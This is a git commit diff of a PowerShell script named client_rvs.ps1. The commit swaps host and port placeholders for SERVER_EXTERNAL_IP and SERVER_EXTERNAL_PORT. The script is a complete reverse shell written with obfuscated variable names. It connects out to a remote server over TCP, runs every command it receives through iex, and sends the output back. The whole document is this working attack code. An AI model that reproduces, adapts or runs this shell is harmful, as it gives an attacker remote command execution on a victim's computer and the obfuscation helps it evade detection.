b6178682be8047d5816e519437e1649e039da4f7
afkfr0mkeyb0ard <123593001+afkfr0mkeyb0ard@users.noreply.github.com>
2024-07-03 04:48:47 +0200

    Update client_rvs.ps1

--- client_rvs.ps1
+++ client_rvs.ps1
@@ -1,6 +1,6 @@
-$DXxkrwHgjd='<HOST>';$OPSqlJlDEg=<PORT>;
+$DXxkrwHgjd='SERVER_EXTERNAL_IP';$OPSqlJlDEg=SERVER_EXTERNAL_PORT;
 $AsDzYCyLzW=(New-Object Net.Sockets.TCPClient($DXxkrwHgjd,$OPSqlJlDEg)).GetStream();
 [byte[]]$IqckfWMkEB=0..65535|%{0};
 while(($eUyaStMAXH=$AsDzYCyLzW.Read($IqckfWMkEB,0,$IqckfWMkEB.Length)) -ne 0){;$kIwypYQIZs=(New-Object Text.ASCIIEncoding).GetString($IqckfWMkEB,0,$eUyaStMAXH);
 $tmdFZtJnEQ=([text.encoding]::ASCII).GetBytes((iex $kIwypYQIZs 2>&1));
-$AsDzYCyLzW.Write($tmdFZtJnEQ,0,$tmdFZtJnEQ.Length)}
+$AsDzYCyLzW.Write($tmdFZtJnEQ,0,$tmdFZtJnEQ.Length)};
